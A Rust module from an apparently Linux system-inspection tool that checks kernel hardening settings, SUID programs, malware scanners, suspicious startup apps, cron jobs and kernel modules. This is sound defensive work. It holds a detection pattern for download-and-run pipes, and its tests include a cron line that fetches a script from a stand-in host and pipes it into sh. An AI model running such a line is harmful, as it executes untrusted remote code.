// SPDX-License-Identifier: Apache-2.0

//! Security checks that need no admin rights: kernel hardening settings, AppArmor,
//! programs with the SUID bit and the package each came from, malware scanners, simple
//! malware signs, and the screen lock.

use std::collections::HashMap;
use std::os::unix::fs::{MetadataExt, PermissionsExt};
use std::time::Duration;

use serde::Serialize;

use super::command;
use super::units::startup;
use crate::collect::SystemRoot;

/// One hardening setting.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Hardening {
    pub name: String,
    /// `kernel.randomize_va_space = 2`.
    pub value: String,
    /// `pass`, `fail`, or `na` (not available on this kernel).
    pub result: String,
    pub recommendation: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct SuidProgram {
    pub path: String,
    pub owner: String,
    /// The package it belongs to; missing means no package owns it.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub package: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct Heuristic {
    pub title: String,
    pub passed: bool,
    pub detail: String,
}

/// The `security` inventory.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
pub struct SecurityInfo {
    pub hardening: Vec<Hardening>,
    pub apparmor: bool,
    pub suid: Vec<SuidProgram>,
    /// Installed scanners, such as `clamav`.
    pub scanners: Vec<String>,
    /// When the ClamAV signatures were last updated, in milliseconds since 1970.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub clamav_updated: Option<i64>,
    pub heuristics: Vec<Heuristic>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub screen_lock: Option<bool>,
}

/// (sysctl path, name, check, recommendation). The check gets the value and says pass or fail.
type Check = (&'static str, &'static str, fn(i64) -> bool, &'static str);

const CHECKS: &[Check] = &[
    (
        "kernel/randomize_va_space",
        "Address space randomization (ASLR)",
        |v| v == 2,
        "Set kernel.randomize_va_space = 2",
    ),
    (
        "kernel/kptr_restrict",
        "Kernel pointers hidden",
        |v| v >= 1,
        "Set kernel.kptr_restrict = 1",
    ),
    (
        "kernel/dmesg_restrict",
        "Kernel log for admins only",
        |v| v == 1,
        "Set kernel.dmesg_restrict = 1",
    ),
    (
        "kernel/yama/ptrace_scope",
        "Processes cannot spy on each other (ptrace)",
        |v| v >= 1,
        "Set kernel.yama.ptrace_scope = 1",
    ),
    (
        "kernel/apparmor_restrict_unprivileged_userns",
        "Unprivileged user namespaces restricted",
        |v| v == 1,
        "Ubuntu 24.04 turns this on by default",
    ),
    (
        "fs/protected_symlinks",
        "Symlink attacks blocked",
        |v| v == 1,
        "Set fs.protected_symlinks = 1",
    ),
    (
        "fs/protected_hardlinks",
        "Hardlink attacks blocked",
        |v| v == 1,
        "Set fs.protected_hardlinks = 1",
    ),
    (
        "fs/protected_regular",
        "File attacks in shared folders blocked",
        |v| v >= 1,
        "Set fs.protected_regular = 2",
    ),
    (
        "fs/suid_dumpable",
        "No core dumps of SUID programs",
        |v| v != 1,
        "Set fs.suid_dumpable = 0 or 2",
    ),
    (
        "net/ipv4/tcp_syncookies",
        "SYN flood protection",
        |v| v == 1,
        "Set net.ipv4.tcp_syncookies = 1",
    ),
    (
        "net/ipv4/conf/all/rp_filter",
        "Spoofed packets filtered",
        |v| v >= 1,
        "Set net.ipv4.conf.all.rp_filter = 1",
    ),
    (
        "net/ipv4/conf/all/accept_redirects",
        "ICMP redirects ignored",
        |v| v == 0,
        "Set net.ipv4.conf.all.accept_redirects = 0",
    ),
];

pub fn hardening(root: &SystemRoot) -> Vec<Hardening> {
    CHECKS
        .iter()
        .map(|(path, name, check, fix)| {
            let key = path.replace('/', ".");
            match root
                .read(&format!("/proc/sys/{path}"))
                .ok()
                .and_then(|v| v.trim().parse::<i64>().ok())
            {
                Some(v) => Hardening {
                    name: (*name).into(),
                    value: format!("{key} = {v}"),
                    result: if check(v) { "pass" } else { "fail" }.into(),
                    recommendation: if check(v) {
                        String::new()
                    } else {
                        (*fix).into()
                    },
                },
                None => Hardening {
                    name: (*name).into(),
                    value: format!("{key}: not on this kernel"),
                    result: "na".into(),
                    recommendation: String::new(),
                },
            }
        })
        .collect()
}

/// SUID programs in the usual program folders.
fn suid_files(root: &SystemRoot, users: &HashMap<u32, String>) -> Vec<(String, String)> {
    let mut out = Vec::new();
    let mut stack: Vec<_> = [
        "/usr/bin",
        "/usr/sbin",
        "/usr/lib",
        "/usr/libexec",
        "/opt",
        "/snap/bin",
    ]
    .iter()
    .map(|d| root.path(d))
    .collect();
    let mut seen = 0u32;
    while let Some(dir) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for e in entries.flatten() {
            seen += 1;
            if seen > 400_000 {
                return out;
            }
            let Ok(meta) = e.path().symlink_metadata() else {
                continue;
            };
            if meta.is_dir() {
                stack.push(e.path());
            } else if meta.is_file() && meta.permissions().mode() & 0o4000 != 0 {
                out.push((
                    e.path().to_string_lossy().into_owned(),
                    users
                        .get(&meta.uid())
                        .cloned()
                        .unwrap_or_else(|| meta.uid().to_string()),
                ));
            }
        }
    }
    out.sort();
    out
}

/// Reads `dpkg -S` output: `sudo: /usr/bin/sudo`.
pub fn owners(text: &str) -> HashMap<String, String> {
    text.lines()
        .filter_map(|l| l.split_once(": "))
        .map(|(pkg, path)| {
            (
                path.trim().to_owned(),
                pkg.split(',')
                    .next()
                    .unwrap_or(pkg)
                    .split(':')
                    .next()
                    .unwrap_or(pkg)
                    .to_owned(),
            )
        })
        .collect()
}

/// Startup commands from temporary or download folders are a common malware sign.
pub fn suspicious_command(command: &str) -> bool {
    ["/tmp/", "/dev/shm/", "/var/tmp/", "/Downloads/"]
        .iter()
        .any(|p| command.contains(p))
}

/// A cron line that downloads and runs a script, such as `curl … | sh`.
pub fn downloads_and_runs(line: &str) -> bool {
    (line.contains("curl") || line.contains("wget"))
        && ["| sh", "|sh", "| bash", "|bash", "| python", "|python"]
            .iter()
            .any(|p| line.contains(p))
}

pub async fn read(root: &SystemRoot, users: &HashMap<u32, String>) -> SecurityInfo {
    let files = suid_files(root, users);
    let paths: Vec<&str> = files.iter().map(|(p, _)| p.as_str()).collect();
    let mut args = vec!["-S"];
    args.extend(paths.iter().copied());
    // `dpkg -S` exits 1 when some path has no package, so its output is read either way.
    let owned = if paths.is_empty() {
        HashMap::new()
    } else {
        owners(
            &command::output_any("dpkg", &args, Duration::from_secs(20))
                .await
                .unwrap_or_default(),
        )
    };
    let suid = files
        .into_iter()
        .map(|(path, owner)| SuidProgram {
            package: owned.get(&path).cloned(),
            path,
            owner,
        })
        .collect();

    let scanners: Vec<String> = [
        ("clamav", "/usr/bin/clamscan"),
        ("rkhunter", "/usr/bin/rkhunter"),
        ("chkrootkit", "/usr/sbin/chkrootkit"),
    ]
    .iter()
    .filter(|(_, p)| root.path(p).exists())
    .map(|(n, _)| (*n).to_owned())
    .collect();
    let clamav_updated = ["daily.cld", "daily.cvd"]
        .iter()
        .filter_map(|f| {
            std::fs::metadata(root.path(&format!("/var/lib/clamav/{f}")))
                .ok()?
                .modified()
                .ok()
        })
        .max()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_millis() as i64);

    let home = std::env::var_os("HOME").map(std::path::PathBuf::from);
    let bad_startup: Vec<String> = startup(root, home.as_deref())
        .into_iter()
        .filter(|a| a.enabled && suspicious_command(&a.command))
        .map(|a| a.name)
        .collect();
    let mut cron_text = command::output("crontab", &["-l"], Duration::from_secs(5))
        .await
        .unwrap_or_default();
    cron_text.push_str(&root.read("/etc/crontab").unwrap_or_default());
    for f in std::fs::read_dir(root.path("/etc/cron.d"))
        .map(|d| d.flatten().map(|e| e.path()).collect::<Vec<_>>())
        .unwrap_or_default()
    {
        cron_text.push_str(&std::fs::read_to_string(f).unwrap_or_default());
    }
    let bad_cron = cron_text
        .lines()
        .filter(|l| !l.trim_start().starts_with('#') && downloads_and_runs(l))
        .count();
    // Kernel modules marked out-of-tree (O) or unsigned (E) did not come with the kernel.
    let mut foreign: Vec<String> = std::fs::read_dir(root.path("/sys/module"))
        .map(|d| {
            d.flatten()
                .filter(|e| {
                    std::fs::read_to_string(e.path().join("taint"))
                        .is_ok_and(|t| t.contains('O') || t.contains('E'))
                })
                .map(|e| e.file_name().to_string_lossy().into_owned())
                .collect()
        })
        .unwrap_or_default();
    foreign.sort();
    let heuristics = vec![
        // A failed check says what it found, not what it hoped for.
        Heuristic {
            title: if bad_startup.is_empty() {
                "No startup apps run from temporary or download folders".into()
            } else {
                "A startup app runs from a temporary or download folder".into()
            },
            passed: bad_startup.is_empty(),
            detail: if bad_startup.is_empty() {
                String::new()
            } else {
                format!(
                    "{}. Malware often starts from there. If you know and trust it, keep it in a folder of its own (such as ~/Applications); if not, turn it off in Services › Startup Applications.",
                    bad_startup.join(", ")
                )
            },
        },
        Heuristic {
            title: if bad_cron == 0 {
                "No cron jobs that download and run scripts".into()
            } else {
                "A cron job downloads and runs a script".into()
            },
            passed: bad_cron == 0,
            detail: if bad_cron == 0 {
                String::new()
            } else {
                format!(
                    "{bad_cron} lines pipe a download into a shell, which runs whatever the server sends. Scheduled Jobs › All Jobs shows them."
                )
            },
        },
        Heuristic {
            title: if foreign.is_empty() {
                "No kernel modules from outside the kernel".into()
            } else {
                "Kernel modules from outside the kernel are loaded".into()
            },
            passed: foreign.is_empty(),
            detail: if foreign.is_empty() {
                String::new()
            } else {
                format!(
                    "{} (often drivers such as VirtualBox or NVIDIA)",
                    foreign.join(", ")
                )
            },
        },
    ];
    let screen_lock = command::output(
        "gsettings",
        &["get", "org.gnome.desktop.screensaver", "lock-enabled"],
        Duration::from_secs(3),
    )
    .await
    .map(|v| v.trim() == "true");
    SecurityInfo {
        hardening: hardening(root),
        apparmor: root
            .read("/sys/module/apparmor/parameters/enabled")
            .is_ok_and(|v| v.trim() == "Y"),
        suid,
        scanners,
        clamav_updated,
        heuristics,
        screen_lock,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::collect::test_support::fixture_root;

    #[test]
    fn checks_kernel_settings() {
        let root = fixture_root(
            "hardening",
            &[
                ("/proc/sys/kernel/randomize_va_space", "2\n"),
                ("/proc/sys/kernel/kptr_restrict", "0\n"),
            ],
        );
        let h = hardening(&root);
        assert_eq!(
            (h[0].result.as_str(), h[0].value.as_str()),
            ("pass", "kernel.randomize_va_space = 2")
        );
        assert_eq!(
            (h[1].result.as_str(), h[1].recommendation.as_str()),
            ("fail", "Set kernel.kptr_restrict = 1")
        );
        assert_eq!(h[2].result, "na");
    }

    #[test]
    fn spots_malware_signs() {
        assert!(suspicious_command(
            "/home/riya/Downloads/app.AppImage --hidden"
        ));
        assert!(!suspicious_command("/usr/bin/nm-applet"));
        assert!(downloads_and_runs(
            "*/5 * * * * curl -s http://x.example/a.sh | sh"
        ));
        assert!(!downloads_and_runs(
            "0 3 * * * curl -o /tmp/x http://x.example"
        ));
        assert_eq!(
            owners("sudo: /usr/bin/sudo\nmount, util-linux: /usr/bin/mount\n")
                .get("/usr/bin/mount")
                .map(String::as_str),
            Some("mount")
        );
    }
}
